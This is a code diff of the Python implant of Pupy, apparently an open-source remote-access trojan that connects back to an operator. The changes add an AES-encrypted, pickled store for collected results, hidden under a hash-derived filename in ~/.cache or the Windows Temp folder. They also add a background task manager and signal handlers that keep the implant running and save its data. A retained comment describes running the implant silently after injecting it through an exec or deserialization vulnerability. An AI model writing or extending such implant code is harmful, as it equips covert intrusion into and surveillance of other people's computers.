@@ -64,6 +64,16 @@ import logging
 import shlex
 import marshal
 import zlib
+import signal
+
+import cPickle
+
+import hashlib
+import uuid
+from network.lib.transports.cryptoutils.aes import \
+     NewAESCipher as AES, \
+     append_PKCS7_padding as pad, \
+     strip_PKCS7_padding as unpad
 
 try:
     # additional imports needed to package with pyinstaller
@@ -91,6 +101,288 @@ except ImportError, e:
 
 pupy.infos = {}  # global dictionary to store informations persistent through a deconnection
 pupy.namespace = None
+
+def print_exception(tag=''):
+    global debug
+
+    remote_print_error = None
+    dprint = None
+
+    try:
+        import pupyimporter
+        remote_print_error = pupyimporter.remote_print_error
+        dprint = pupyimporter.dprint
+    except:
+        pass
+
+    import traceback
+    trace = str(traceback.format_exc())
+    error = ' '.join([ x for x in (
+        tag, 'Exception:', trace
+    ) if x ])
+
+    if remote_print_error:
+        try:
+            remote_print_error(error)
+        except Exception, e:
+            pass
+    elif dprint:
+        dprint(error)
+    elif debug:
+        try:
+            logging.error(error)
+        except:
+            print error
+
+class PStore(object):
+    def __new__(cls, *args, **kw):
+        if not hasattr(cls, '_instance'):
+            orig = super(PStore, cls)
+            cls._instance = orig.__new__(cls, *args, **kw)
+
+        return cls._instance
+
+    def __init__(self, pstore_dir='~'):
+        try:
+            import getpass
+            uid = getpass.getuser()
+        except:
+            uid = os.getuid()
+
+        seed = '{}:{}'.format(uid, uuid.getnode())
+
+        h = hashlib.sha1()
+        h.update(seed)
+
+        if os.name == 'posix':
+            if pstore_dir == '~':
+                pstore_dir = os.path.join(pstore_dir, '.cache')
+            pstore_name = '.{}'.format(h.hexdigest())
+        else:
+            if pstore_dir == '~':
+                pstore_dir = os.path.join(
+                    pstore_dir, 'AppData', 'Local', 'Temp'
+                )
+            pstore_name = h.hexdigest()
+
+        self._pstore_path = os.path.expanduser(
+            os.path.join(pstore_dir, pstore_name)
+        )
+
+        h = hashlib.sha1()
+        h.update('password' + seed)
+
+        self._pstore_key = (h.digest()[:16], '\x00'*16)
+        self._pstore = {}
+
+        self.load()
+
+    def __getitem__(self, key):
+        if issubclass(type(key), object):
+            key = type(key).__name__
+        return self._pstore.get(key)
+
+    def __setitem__(self, key, value):
+        if issubclass(type(key), object):
+            key = type(key).__name__
+        self._pstore[key] = value
+
+    def load(self):
+        if not os.path.exists(self._pstore_path):
+            return
+
+        data = None
+        try:
+            with open(self._pstore_path, 'rb') as pstore:
+                data = pstore.read()
+
+            try:
+                os.unlink(self._pstore_path)
+            except:
+                print_exception('PS/L')
+
+            if not data:
+                return
+
+            data = AES(*self._pstore_key).decrypt(data)
+            data = unpad(data)
+            data = cPickle.loads(data)
+        except:
+            print_exception('[PS/L]')
+            return
+
+        if type(data) == dict:
+            self._pstore.update(data)
+
+    def store(self):
+        if not self._pstore:
+            return
+
+        pstore_dir = os.path.dirname(self._pstore_path)
+        try:
+            if not os.path.isdir(pstore_dir):
+                os.makedirs(pstore_dir)
+
+            with open(self._pstore_path, 'w+b') as pstore:
+                data = cPickle.dumps(self._pstore)
+                data = pad(data)
+                data = AES(*self._pstore_key).encrypt(data)
+                pstore.write(data)
+
+        except:
+            print_exception('[PS/S]')
+            return
+
+
+class Task(threading.Thread):
+    stopped = None
+    results_type = list
+
+    def __init__(self, manager, *args, **kwargs):
+        threading.Thread.__init__(self)
+        self.daemon = True
+        self._pstore = manager.pstore
+        self._stopped = threading.Event()
+        if not self._pstore[self]:
+            self._pstore[self] = self.results_type()
+        self._manager = manager
+        self._dirty = False
+
+    @property
+    def name(self):
+        return type(self).__name__
+
+    @property
+    def results(self):
+        results = self._pstore[self]
+        self._pstore[self] = self.results_type()
+        self._dirty = False
+        return results
+
+    @property
+    def dirty(self):
+        return self._dirty
+
+    def append(self, result):
+        if self.results_type in (str, unicode):
+            self._pstore[self] += result
+        elif self.results_type == list:
+            self._pstore[self].append(result)
+        elif self.results_type == set:
+            self._pstore[self].add(result)
+        else:
+            raise TypeError('Unknown results type: {}'.format(self.results_type))
+        self._dirty = True
+
+    def stop(self):
+        if self._stopped and self.active:
+            self._stopped.set()
+
+    def run(self):
+        try:
+            self.task()
+        except:
+            print_exception('[T/R:{}]'.format(self.name))
+            if self._stopped:
+                self._stopped.set()
+
+    @property
+    def active(self):
+        if self._stopped is None:
+            return False
+
+        try:
+            return not self._stopped.is_set()
+
+        except:
+            print_exception('[T/A:{}]'.format(self.name))
+            return False
+
+    def event(self, event):
+        pass
+
+class Manager(object):
+    TERMINATE = 0
+    PAUSE = 1
+    SESSION = 2
+
+    def __new__(cls, *args, **kw):
+        if not hasattr(cls, '_instance'):
+            orig = super(Manager, cls)
+            cls._instance = orig.__new__(cls, *args, **kw)
+
+        return cls._instance
+
+    def __init__(self, pstore):
+        self.tasks = {}
+        self.pstore = pstore
+
+    def get(self, klass):
+        name = klass.__name__
+        return self.tasks.get(name)
+
+    def create(self, klass, *args, **kwargs):
+        name = klass.__name__
+        if not name in self.tasks:
+            try:
+                task = klass(self, *args, **kwargs)
+                task.start()
+                self.tasks[name] = task
+                return task
+
+            except:
+                print_exception('[M/C:{}]'.format(name))
+
+    def stop(self, klass, force=False):
+        name = klass.__name__
+        if name in self.tasks:
+            try:
+                self.tasks[name].stop()
+                del self.tasks[name]
+            except:
+                print_exception('[M/S:{}]'.format(name))
+                if force:
+                    del self.tasks[name]
+
+    def active(self, klass=None):
+        name = klass.__name__
+        if name in self.tasks:
+            if not self.tasks[name].stopped:
+                # Failed somewhere in the middle
+                del self.tasks[name]
+                return False
+
+            return self.tasks[name].stopped.is_set()
+        else:
+            return False
+
+    @property
+    def status(self):
+        return {
+            name:{
+                'active': task.active,
+                'results': task.dirty,
+            } for name,task in self.tasks.iteritems()
+        }
+
+    def event(self, event):
+        for task in self.tasks.itervalues():
+            try:
+                task.event(event)
+            except:
+                print_exception('[M/E:{}:{}]'.format(task.name, event))
+
+        if event == self.TERMINATE:
+            for task in self.tasks.itervalues():
+                try:
+                    task.stop()
+                except:
+                    print_exception('[M/E:{}:{}]'.format(task.name, event))
+
+            self.pstore.store()
+
+setattr(pupy, 'manager', Manager(PStore()))
+setattr(pupy, 'Task', Task)
 
 def safe_obtain(proxy):
     """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
@@ -150,20 +442,18 @@ class ReverseSlaveService(Service):
         self._conn.root.set_modules(pupy.namespace)
 
     def on_disconnect(self):
-        print "disconnecting !"
         for cleanup in self.exposed_cleanups:
             try:
                 cleanup()
             except Exception as e:
-                logging.exception(e)
+                print_exception('[D]')
 
         self.exposed_cleanups = []
 
         try:
             self._conn.close()
         except Exception as e:
-            logging.exception(e)
-            raise
+            print_exception('[DC]')
 
         if os.name == 'posix':
             try:
@@ -285,6 +575,19 @@ def set_connect_back_host(HOST):
 def handle_sigchld(*args, **kwargs):
     os.waitpid(-1, os.WNOHANG)
 
+def handle_sighup(*args):
+    pass
+
+def handle_sigterm(*args):
+    try:
+        if hasattr(pupy, 'manager'):
+            pupy.manager.event(Manager.TERMINATE)
+
+    except:
+        print_exception('[ST]')
+
+    os._exit(0)
+
 attempt = 0
 
 def main():
@@ -292,6 +595,17 @@ def main():
     global LAUNCHER_ARGS
     global debug
     global attempt
+
+    try:
+        if hasattr(signal, 'SIGHUP'):
+            signal.signal(signal.SIGHUP, handle_sighup)
+        if hasattr(signal, 'SIGTERM'):
+            signal.signal(signal.SIGTERM, handle_sigterm)
+    except:
+        print_exception('[MS]')
+
+    if hasattr(pupy, 'set_exit_session_callback'):
+        pupy.set_exit_session_callback(handle_sigterm)
 
     if len(sys.argv) > 1:
         parser = argparse.ArgumentParser(
@@ -334,11 +648,13 @@ def main():
         logging.getLogger().setLevel(logging.DEBUG)
 
     launcher = conf.launchers[LAUNCHER]()
+
     try:
         launcher.parse_args(LAUNCHER_ARGS)
     except LauncherError as e:
         launcher.arg_parser.print_usage()
-        exit(str(e))
+        os._exit(str(e))
+
     if getattr(pupy, 'pseudo', False):
         set_connect_back_host(launcher.get_host())
     else:
@@ -359,14 +675,10 @@ def main():
             rpyc_loop(launcher)
 
         except Exception as e:
+            print_exception('[ML]')
+
             if type(e) == SystemExit:
                 exited = True
-
-            if debug:
-                try:
-                    logging.exception(e)
-                except:
-                    print "Exception ({}): {}".format(type(e), e)
 
         finally:
             if not exited:
@@ -429,7 +741,7 @@ def rpyc_loop(launcher):
                         interval, timeout = conn.get_pings()
                         conn.serve(interval or 10)
                         if interval:
-                            conn.ping(timeout)
+                            conn.ping(timeout=timeout)
 
         except SystemExit:
             raise
@@ -437,12 +749,9 @@ def rpyc_loop(launcher):
         except EOFError:
             pass
 
-        except Exception as e:
-            if debug:
-                try:
-                    logging.exception(e)
-                except:
-                    print "Exception ({}): {}".format(type(e), e)
+        except:
+            print_exception('[M]')
+
         finally:
             if stream is not None:
                 try:
@@ -453,16 +762,12 @@ def rpyc_loop(launcher):
 if __name__ == "__main__":
     main()
 else:
-    is_android = False
-
-    try:
-        from kivy.utils import platform as kivy_plat
-        if kivy_plat=="android":
-            is_android=True
-    except:
-        pass
-
-    if not is_android:
-        t=threading.Thread(target=main) # to allow pupy to run in background when imported or injected through a python application exec/deserialization vulnerability
-        t.daemon=True
-        t.start()
+    import platform
+    if not platform.system() == 'android':
+        if not hasattr(platform, 'pupy_thread'):
+            # to allow pupy to run in background when imported or injected
+            # through a python application exec/deserialization vulnerability
+            t = threading.Thread(target=main)
+            t.daemon = True
+            t.start()
+            setattr(platform, 'pupy_thread', t)
